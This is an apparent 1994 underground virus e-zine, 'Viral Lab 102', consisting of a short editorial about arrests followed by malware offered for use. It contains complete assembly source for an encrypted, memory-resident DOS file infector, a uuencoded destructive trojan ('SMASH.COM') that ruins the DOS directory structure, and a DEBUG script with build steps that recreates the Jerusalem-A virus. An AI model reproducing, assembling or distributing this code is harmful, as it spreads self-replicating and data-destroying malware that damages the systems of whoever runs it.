@@ -1,0 +1,538 @@
+Viral Lab 102
+May 1994
+
+CONTENTS:
+
+Editorial
+VIRAL LAB 102's VIRUS #1 SOURCE
+SMASH.COM Trojan Horse of the month
+Afterword
+After-Afterword:  Jerusalem-A debug script
+
+EDITORIAL
+By Spear
+
+Well, here it is!  The long awaited (maybe) #2 issue of Viral Labs!  You may
+wonder why your name was not on the mailing list.  That's because we are going
+to not have a mailing list at all.  When you want it, you gotta mail here for
+it.  The reason for this is because when we got busted after last issue, for
+reasons which will be explained later in this editorial, the piggies tried to
+implicate some of the people that were on our mailing list.
+
+These people's names will not be mentioned, but the mailing list was submitted
+as evidence in the case surrounding a group of people and their packet-sniffing
+project.  It was supposedly supposed to be valid proof that they were people
+who enjoyed reaking havoc on systems around the net.
+
+Also, some stupid kid decided to put the trojan horse that was in the last
+issue onto his network in substitute for the executeable file for word-perfect.
+He got caught pretty fast, because of the fact that he wrote the source code
+and put his name in it.  He had some dumb copyright thing in it, and when
+the labbies at his college viewed it with a hex-editor, lo and behold!  The
+program is named!  Plus he bragged all about school about it and accidentally
+told people who didn't really care if he got kicked out of school or not.
+Bummer.  
+
+The moral of this story is, only use this mag for entertainment and education
+purposed only!  Otherwise!  You're going to get caught.  The other moral is,
+if you have a e-mag, don't keep a file with people's subscriptions in it 
+laying around the system.
+
+VIRAL LAB 102's VIRUS #1
+By Spear
+
+ATTRIBUTES:
+This is a memory resident .com and .exe infector.  It is encrypted using a
+method much like that of DA's methods of encryption.  The maximum size of
+this virus is 1000 bytes, which is fairly tiny.  This virus only spreads,
+there are no trojan horses in it in order to keep it small.  It is of the
+tiny class of virii that P/S creates often.  Everytime a file containing
+this virus is executed, it infects 10 other files on the system.  Infects
+command.com as well.  
+
+Compile using TASM in non-case sensitive mode.
+
+;Viral Lab 102 Virus of the Month Source code.              
+
+checkres1       =       'DA'
+checkres2       =       'PS'
+id              =       'DA'
+                
+        .model  tiny
+        .code   
+        org     0000h
+                
+start:
+ENCRYPT:
+patchstart:
+        mov     bx, offset endencrypt
+        mov     cx, (heap-endencrypt)/2+1
+encrypt_loop:
+        db      002Eh                   ; cs:
+        db      0081h                   ; add word ptr [bx], xxxx
+xorpatch        db      0007h
+encryptvalue    dw      0000h
+        add     bx, 0002h
+        loop    encrypt_loop
+endencrypt:
+        call    next
+next:
+        pop     bp
+        sub     bp, offset next
+                
+        push    es
+        push    ds
+                
+        mov     ax, checkres1           ; Installation check
+        int     0021h
+        cmp     ax, checkres2           ; Already installed?
+        jz      done_install
+                
+        mov     ax, ds
+        dec     ax
+        mov     ds, ax
+        sub     word ptr ds:[0003h], ((endheap-start+1023)/1024)*64
+        sub     word ptr ds:[0012h], ((endheap-start+1023)/1024)*64
+        mov     es, word ptr ds:[0012h]
+                
+        push    cs
+        pop     ds
+        xor     di, di
+        mov     cx, (heap-start)/2+1    ; Bytes to move
+        mov     si, bp                  ; lea  si,[bp+offset start]
+        rep     movsw   
+                
+        xor     ax, ax
+        mov     ds, ax
+        sub     word ptr ds:[0413h], (endheap-start+1023)/1024
+        push    ds
+        lds     ax, ds:[21h*4]          ; Get old int handler
+        mov     word ptr es:oldint21, ax
+        mov     word ptr es:oldint21+2, ds
+        pop     ds
+        mov     word ptr ds:[21h*4], offset int21 ; Replace with new handler
+        mov     ds:[21h*4+2], es        ; in high memory
+                
+done_install:
+        pop     es
+        pop     ds
+        cmp     sp, id
+        je      restore_EXE
+restore_COM:
+        mov     di, 0100h
+        push    di
+        lea     si, [bp+offset old3]
+        movsw   
+        movsb   
+        ret     
+                
+restore_EXE:
+        mov     ax, ds
+        add     ax, 0010h
+        add     cs:[bp+word ptr origCSIP+2], ax
+        add     ax, cs:[bp+word ptr origSPSS]
+        cli     
+        mov     ss, ax
+        mov     sp, cs:[bp+word ptr origSPSS+2]
+        sti     
+        db      00EAh
+origCSIP        db      ?
+old3            db      0cdh,20h,0
+origSPSS        dd      ?
+                
+int21:
+        push    ax
+        push    bx
+        push    cx
+        push    dx
+        push    si
+        push    di
+        push    ds
+        push    es
+                
+        cmp     ax, 4B00h               ; execute?
+        jz      execute
+return:
+        jmp     exitint21
+execute:
+        mov     word ptr cs:filename, dx
+        mov     word ptr cs:filename+2, ds
+        mov     ax, 4300h
+        lds     dx, cs:filename
+        int     0021h
+        jc      return
+        push    cx
+        push    ds
+        push    dx
+                
+        mov     ax, 4301h               ; clear file attributes
+        push    ax                      ; save for later use
+        xor     cx, cx
+        int     0021h
+                
+        mov     ax, 3D02h
+        lds     dx, cs:filename
+        int     0021h
+        xchg    ax, bx
+                
+        push    cs
+        pop     ds
+                
+        push    cs
+        pop     es
+                
+        mov     ax, 5700h               ; get file time/date
+        int     0021h
+        push    cx
+        push    dx
+                
+        mov     cx, 001Ah
+        mov     dx, offset readbuffer
+        mov     ah, 003Fh
+        int     0021h
+                
+        mov     ax, 4202h
+        xor     cx, cx
+        xor     dx, dx
+        int     0021h
+                
+        cmp     word ptr [offset readbuffer], 'ZM'
+        jz      checkEXE
+                
+        mov     cx, word ptr [offset readbuffer+1] ; jmp location
+        add     cx, heap-start+3        ; convert to filesize
+        cmp     ax, cx                  ; equal if already infected
+        jz      jmp_close
+                
+        cmp     ax, 03E8h            ; check if too large
+        ja      jmp_close               ; Exit if so
+                
+        mov     di, offset old3
+        mov     si, offset readbuffer
+        movsb   
+        movsw   
+                
+        mov     si, ax                  ; save entry point
+        add     si, 0100h
+        mov     cx, 0003h
+        sub     ax, cx
+        mov     word ptr [offset readbuffer+1], ax
+        mov     dl, 00E9h
+        mov     byte ptr [offset readbuffer], dl
+        jmp     short continue_infect
+checkEXE:
+        cmp     word ptr [offset readbuffer+10h], id
+        jnz     skipp
+jmp_close:
+        jmp     close
+skipp:
+                
+        lea     di, origCSIP
+        lea     si, readbuffer+14h
+        movsw                           ; Save original CS and IP
+        movsw   
+                
+        sub     si, 000Ah
+        movsw                           ; Save original SS and SP
+        movsw   
+                
+        push    bx                      ; save file handle
+        mov     bx, word ptr [readbuffer+8] ; Header size in paragraphs
+        mov     cl, 0004h
+        shl     bx, cl
+                
+        push    dx                      ; Save file size on the
+        push    ax                      ; stack
+                
+        sub     ax, bx                  ; File size - Header size
+        sbb     dx, 0000h               ; DX:AX - BX -> DX:AX
+                
+        mov     cx, 0010h
+        div     cx                      ; DX:AX/CX = AX Remainder DX
+                
+        mov     word ptr [readbuffer+14h], dx ; IP Offset
+        mov     word ptr [readbuffer+10h], id ; Initial SP
+        mov     word ptr [readbuffer+0Eh], ax ; Para disp stack segment
+        mov     word ptr [readbuffer+16h], ax ; Para disp CS in module.
+                
+        mov     si, dx                  ; save entry point
+        pop     ax                      ; Filelength in DX:AX
+        pop     dx
+                
+        add     ax, heap-start
+        adc     dx, 0000h
+                
+        mov     cl, 0009h
+        push    ax
+        shr     ax, cl
+        ror     dx, cl
+        stc     
+        adc     dx, ax
+        pop     ax
+        and     ah, 0001h
+                
+        mov     word ptr [readbuffer+2], ax ; the EXE header.
+        mov     word ptr [readbuffer+4], dx ; Fix-up the file size in
+                
+        pop     bx                      ; restore file handle
+        mov     cx, 001Ah
+                
+continue_infect:
+        push    cx                      ; save # bytes to write
+                
+        mov     ah, 002Ch               ; Get current time
+        int     0021h
+                
+        add     si, (offset endencrypt-offset encrypt)
+        mov     word ptr ds:[patchstart+1], si
+        mov     word ptr ds:[encryptvalue], dx
+                
+        mov     di, offset encryptbuffer
+        mov     si, offset ENCRYPT
+        mov     cx, (heap-encrypt)/2
+        push    si
+        rep     movsw                   ; copy virus to buffer
+                
+        mov     ax, offset endencrypt-encrypt+encryptbuffer
+        mov     word ptr ds:[patchstart+1], ax
+        pop     si
+        push    offset endencrypt
+        mov     byte ptr [offset endencrypt], 00C3h ; retn
+        xor     byte ptr [offset xorpatch-encrypt+encryptbuffer], 0028h
+        push    bx
+        call    si                      ; encrypt virus in buffer
+        pop     bx
+        pop     word ptr [offset endencrypt]
+                
+        xor     byte ptr [offset xorpatch], 0028h
+                
+        mov     ah, 0040h
+        mov     cx, heap-encrypt
+        mov     dx, offset encryptbuffer
+        int     0021h
+                
+        mov     ax, 4200h
+        xor     cx, cx
+        cwd     
+        int     0021h
+                
+                
+        mov     dx, offset readbuffer
+        pop     cx
+        mov     ah, 0040h
+        int     0021h
+                
+                
+close:
+        mov     ax, 5701h               ; restore file time/date
+        pop     dx
+        pop     cx
+        int     0021h
+                
+        mov     ah, 003Eh
+        int     0021h
+                
+        pop     ax                      ; restore file attributes
+        pop     dx                      ; get filename and
+        pop     ds
+        pop     cx                      ; attributes from stack
+        int     0021h
+                
+exitint21:
+        pop     es
+        pop     ds
+        pop     di
+        pop     si
+        pop     dx
+        pop     cx
+        pop     bx
+        pop     ax
+                
+        db      00EAh                   ; return to original handler
+oldint21        dd      ?
+                
+heap:
+encryptbuffer   db      (heap-encrypt)+1 dup (?)
+filename        dd      ?
+readbuffer      db      1ah dup (?)
+endheap:
+        end     start
+
+
+
+TROJAN HORSE OF THE MONTH:
+
+This trojan takes all the files in the \dos directory and copies them as
+files, which totally ruins the file structure of the system.  In order to
+fix this, a person will have to format his hard-drive because DOS commands
+are rendered inexecutable and you cannot remove the directories they are
+in.  They are invalid directories, and no matter what is done, a person 
+who is inflicted with this puppy cannot remove the directories or get rid of
+them without using norton utilities to fix the invalid chains.
+
+In order to get the file out of this puppy, in your unix account, type
+
+uudecode <filename> 
+after clipping here...
+
+-------clip clip clip---------------------------------------
+begin 644 smash.com
+MZ:,`&BHN*@`J`%P`````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M`````````````````````````````````````````+]J`KYJ`KD)`/RL-)*J
+M2>,"Z_>Z3`&T&LTAM!G-(8K0_L*T1[X,`<TAN@H!M#O-(;D3`+H(`;1.S2%R
+M;>D'`+1/N@@!Z_*Z:@&T.\TAM"_-(8P&H@&)'J0!S2&Z=P&T&LTAN0<`N@0!
+MM$[-(7(FN`%#,\FZE0'-(7(OM#S-(7(IB]AR$+1!S2&T/LTAM#G-(;1/Z]:T
+M&HX>H@&+%J0!S2&Z"@&T.\TAZY:T.[H*`<TAM#FZ:@+-(7(`N@P!M#O-(;1,
+MS2'!^?OA_[QMLFT`&AH:&AH:&AH:&AH:&AH:&AH:&AH:&AH:&AH:&DUS1&]S
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+1````````````````````````
+`
+end
+-------clip clip clip----------------------------------------
+
+
+AFTERWORD
+BY SPEAR
+
+Well, this is the end.  When the other writers of this mag come back, maybe
+it will start to grow longer, but until then, I guess you're outa luck.
+
+Also, if you want a copy of this, email an73361@anon.penet.fi
+
+If you want to contribute anything to this anonymously or not, send to the
+same address!  Thanks!
+
+AFTER-AFTERWORD
+
+Here's the debug script for the jerusalm-a virus!  Have fun!
+
+To compile it, clip this one at the dotted line and save it as jeru-a.src
+
+Then type debug <jeru-a.src from the dos prompt.
+
+This virus copies itself rather quickly, and is memory resident.
+
+----------CLIP-----------------------------------------
+n jeru-a.com
+e 0100  E9 92 00 DA AA A3 AA D4 3A A3 00 01 23 31 00 00
+e 0110  00 02 00 04 01 64 30 A0 06 55 2E 56 05 9F 19 A5
+e 0120  3E 00 00 00 00 00 00 00 00 00 00 00 00 00 E8 06
+e 0130  0E 97 30 80 00 00 00 80 00 97 30 5C 00 97 30 6C
+e 0140  00 97 30 00 40 46 63 F4 1D D0 5C 00 00 46 00 4D
+e 0150  5A A0 01 39 00 B4 02 AF 00 7C 04 7C A4 FA 05 10
+e 0160  07 84 19 C5 00 FA 05 1C 00 00 00 00 00 00 00 00
+e 0170  05 00 20 00 21 00 28 02 00 02 10 00 90 6A 00 00
+e 0180  B9 41 2A 97 4C 4F 52 44 20 53 4B 49 53 4D 20 01
+e 0190  00 00 00 00 00 FC B4 E0 CD 21 3D 00 E0 73 16 80
+e 01A0  FC 03 72 11 BF 00 01 B4 DD BE 10 07 03 F7 2E 8B
+e 01B0  8D 11 00 CD 21 8C C8 04 10 00 8E D0 BC 00 07 50
+e 01C0  B8 C5 00 50 CB 06 FC 2E 8C 06 31 00 2E 8C 06 39
+e 01D0  00 2E 8C 06 3D 00 2E 8C 06 41 00 8C C0 05 10 00
+e 01E0  2E 01 06 49 00 2E 01 06 45 00 B4 E0 CD 21 80 FC
+e 01F0  E0 73 13 80 FC 03 07 2E 8E 16 45 00 2E 8B 26 43
+e 0200  00 2E FF 2E 47 00 33 C0 8E C0 8B 89 31 DB 2E A3
+e 0210  4B 00 26 A0 FE 03 2E A2 4D 00 26 C7 06 FC 03 F3
+e 0220  A5 26 C6 06 FE 03 CB 58 04 10 90 8E C0 0E 1F B9
+e 0230  00 03 B1 88 33 F6 8B FE 06 B8 42 01 50 EA FC 03
+e 0240  00 00 8C C8 8E D0 BC 00 07 33 C0 8E D8 2E A1 4B
+e 0250  00 A3 FC 03 2E A0 4D 00 A2 FE 03 8B DC B1 04 D3
+e 0260  EB 83 C3 10 2E 89 1E 33 00 B4 4A 2E 8E 06 31 00
+e 0270  CD 21 B8 21 35 CD 21 2E 89 1E 17 00 2E 8C 06 19
+e 0280  00 0E 1F BA 5B 02 B8 21 25 CD 21 8E 06 31 00 26
+e 0290  8E 06 2C 00 33 FF B9 FF 7F 32 C0 F2 AE 26 38 05
+e 02A0  E0 F9 8B D7 83 C2 03 B8 00 4B 06 1F 0E 07 BB 35
+e 02B0  00 52 51 53 50 06 1E B4 2A CD 21 2E C6 06 0E 00
+e 02C0  00 81 F9 C6 07 74 30 3C 05 75 0D 80 FA 17 72 08
+e 02D0  2E FE 06 0E 00 EB 20 90 B8 08 35 CD 21 2E 89 1E
+e 02E0  13 00 2E 8C 06 15 00 0E 1F C7 06 1F 00 48 3F B8
+e 02F0  08 25 BA 1E 02 CD 21 1F 07 58 5B 59 5A 9C 2E FF
+e 0300  1E 17 00 1E 07 B4 49 CD 21 B4 4D CD 21 B4 31 BA
+e 0310  00 06 B1 04 D3 EA 83 C2 10 CD 21 32 C0 CF 2E 83
+e 0320  3E 1F 00 09 75 17 52 51 50 B4 2A CD 21 81 FA 06
+e 0330  06 75 07 B8 01 07 B2 80 CD 13 58 59 5A 2E 83 2E
+e 0340  1F 00 01 EB 11 20 20 53 75 62 2D 5A 65 72 6F 20
+e 0350  4E 59 48 43 20 20 2E FF 2E 13 00 9C 80 FC E0 75
+e 0360  05 B8 00 03 9D CF 80 FC DE 74 2D 80 FC DD 74 0E
+e 0370  3D 00 4B 75 03 E9 B4 00 9D 2E FF 2E 17 00 58 58
+e 0380  B8 00 01 2E A3 0A 00 58 2E A3 0C 00 F3 A4 9D 2E
+e 0390  A1 0F 00 2E FF 2E 0A 00 83 C4 06 9D 8C C8 8E D0
+e 03A0  BC 10 07 06 06 33 FF 0E 07 B9 10 00 8B F3 BF 21
+e 03B0  00 F3 A4 8C D8 8E C0 2E F7 26 7A 00 2E 03 06 2B
+e 03C0  00 83 D2 00 2E F7 36 7A 00 8E D8 8B F2 8B FA 8C
+e 03D0  C5 2E 8B 1E 2F 00 0B DB 74 13 B9 00 80 F3 A5 05
+e 03E0  00 10 81 C5 00 10 8E D8 8E C5 4B 75 ED 2E 8B 0E
+e 03F0  2D 00 F3 A4 58 50 05 10 00 2E 01 06 29 00 2E 01
+e 0400  06 25 00 2E A1 21 00 1F 07 2E 8E 16 29 00 2E 8B
+e 0410  26 27 00 2E FF 2E 23 00 33 C9 B8 01 43 CD 21 B4
+e 0420  3C CD 21 B8 00 4B 9D 2E FF 2E 17 00 2E 80 3E 0E
+e 0430  00 01 74 E4 2E C7 06 70 00 FF FF 2E C7 06 8F 00
+e 0440  00 00 2E 89 16 80 00 2E 8C 1E 82 00 50 53 51 52
+e 0450  56 57 1E 06 FC 8B FA 32 D2 80 7D 01 3A 75 05 8A
+e 0460  15 80 E2 1F B4 36 CD 21 3D FF FF 75 03 E9 77 02
+e 0470  F7 E3 F7 E1 0B D2 75 05 3D 10 07 72 F0 2E 8B 16
+e 0480  80 00 1E 07 32 C0 B9 41 00 F2 AE 2E 8B 36 80 00
+e 0490  8A 04 0A C0 74 0E 3C 61 72 07 3C 7A 77 03 80 2C
+e 04A0  20 46 EB EC B9 0B 00 2B F1 BF 84 00 0E 07 B9 0B
+e 04B0  00 F3 A6 75 03 E9 2F 02 B8 00 43 CD 21 72 05 2E
+e 04C0  89 0E 72 00 72 25 32 C0 2E A2 4E 00 1E 07 8B FA
+e 04D0  B9 41 00 F2 AE 80 7D FE 4D 74 0B 80 7D FE 6D 74
+e 04E0  05 2E FE 06 4E 00 B8 00 3D CD 21 72 5A 2E A3 70
+e 04F0  00 8B D8 B8 02 42 B9 FF FF BA FB FF CD 21 72 EB
+e 0500  05 05 00 2E A3 11 00 B9 05 00 BA 6B 00 8C C8 8E
+e 0510  D8 8E C0 B4 3F CD 21 8B FA BE 05 00 F3 A6 75 07
+e 0520  B4 3E CD 21 E9 C0 01 B8 24 35 CD 21 89 1E 1B 00
+e 0530  8C 06 1D 00 BA 1B 02 B8 24 25 CD 21 C5 16 80 00
+e 0540  33 C9 B8 01 43 CD 21 72 3B 2E 8B 1E 70 00 B4 3E
+e 0550  CD 21 2E C7 06 70 00 FF FF B8 02 3D CD 21 72 24
+e 0560  2E A3 70 00 8C C8 8E D8 8E C0 8B 1E 70 00 B8 00
+e 0570  57 CD 21 89 16 74 00 89 0E 76 00 B8 00 42 33 C9
+e 0580  8B D1 CD 21 72 3D 80 3E 4E 00 00 74 03 EB 57 90
+e 0590  BB 00 10 B4 48 CD 21 73 0B B4 3E 8B 1E 70 00 CD
+e 05A0  21 E9 43 01 FF 06 8F 00 8E C0 33 F6 8B FE B9 10
+e 05B0  07 F3 A4 8B D7 8B 0E 11 00 8B 1E 70 00 06 1F B4
+e 05C0  3F CD 21 72 1C 03 F9 33 C9 8B D1 B8 00 42 CD 21
+e 05D0  BE 05 00 B9 05 00 F3 2E A4 8B CF 33 D2 B4 40 CD
+e 05E0  21 72 0D E9 BC 00 B9 1C 00 BA 4F 00 B4 3F CD 21
+e 05F0  72 4A C7 06 61 00 84 19 A1 5D 00 A3 45 00 A1 5F
+e 0600  00 A3 43 00 A1 63 00 A3 47 00 A1 65 00 A3 49 00
+e 0610  A1 53 00 83 3E 51 00 00 74 01 48 F7 26 78 00 03
+e 0620  06 51 00 83 D2 00 05 0F 00 83 D2 00 25 F0 FF A3
+e 0630  7C 00 89 16 7E 00 05 10 07 83 D2 00 72 3A F7 36
+e 0640  78 00 0B D2 74 01 40 A3 53 00 89 16 51 00 A1 7C
+e 0650  00 8B 16 7E 00 F7 36 7A 00 2B 06 57 00 A3 65 00
+e 0660  C7 06 63 00 C5 00 A3 5D 00 C7 06 5F 00 10 07 33
+e 0670  C9 8B D1 B8 00 42 CD 21 72 0A B9 1C 00 BA 4F 00
+e 0680  B4 40 CD 21 72 11 3B C1 75 18 8B 16 7C 00 8B 0E
+e 0690  7E 00 B8 00 42 CD 21 72 09 33 D2 B9 10 07 B4 40
+e 06A0  CD 21 2E 83 3E 8F 00 00 74 04 B4 49 CD 21 2E 83
+e 06B0  3E 70 00 FF 74 31 2E 8B 1E 70 00 2E 8B 16 74 00
+e 06C0  2E 8B 0E 76 00 B8 01 57 CD 21 B4 3E CD 21 2E C5
+e 06D0  16 80 00 2E 8B 0E 72 00 B8 01 43 CD 21 2E C5 16
+e 06E0  1B 00 B8 24 25 CD 21 07 1F 5F 5E 5A 59 5B 58 9D
+e 06F0  2E FF 2E 17 00 00 00 00 00 00 00 00 00 00 00 00
+e 0700  4D 9F 19 00 10 00 00 00 45 44 00 45 4C 00 00 00
+e 0710  E9 92 00 DA AA A3 AA D4 3A A3 00 01 23 31 00 00
+e 0720  00 02 00 04 01 64 30 A0 06 55 2E 56 05 9F 19 A5
+e 0730  3E 00 00 00 00 00 00 00 00 00 00 00 00 00 E8 06
+e 0740  0E 97 30 80 00 00 00 80 00 97 30 5C 00 97 30 6C
+e 0750  00 97 30 00 40 46 63 F4 1D D0 5C 00 00 46 00 4D
+e 0760  5A A0 01 39 00 B4 02 AF 00 7C 04 7C A4 FA 05 10
+e 0770  07 84 19 C5 00 FA 05 1C 00 00 00 00 00 00 00 00
+e 0780  05 00 20 00 21 00 28 02 00 02 10 00 90 6A 00 00
+e 0790  B9 41 2A 97 4C 4F 52 44 20 53 4B 49 53 4D 20 01
+e 07A0  00 00 00 00 00 FC B4 E0 CD 21 3D 00 E0 73 16 80
+e 07B0  FC 03 72 11 BF 00 01 B4 DD BE 10 07 03 F7 2E 8B
+e 07C0  8D 11 00 CD 21 8C C8 04 10 00 8E D0 BC 00 07 50
+e 07D0  B8 C5 00 50 CB 06 FC 2E 8C 06 31 00 2E 8C 06 39
+e 07E0  00 2E 8C 06 3D 00 2E 8C 06 41 00 8C C0 05 10 00
+e 07F0  2E 01 06 49 00 2E 01 06 45 00 B4 E0 CD 21 80 FC
+e 0800  E0 73 13 80 FC 03 07 2E 8E 16 45 00 2E 8B 26 43
+e 0810  CD 20 A3 AA D4 3A A3 1A 1A 1A 1A 1A 1A 1A 1A 1A
+
+rcx
+717
+w
+q
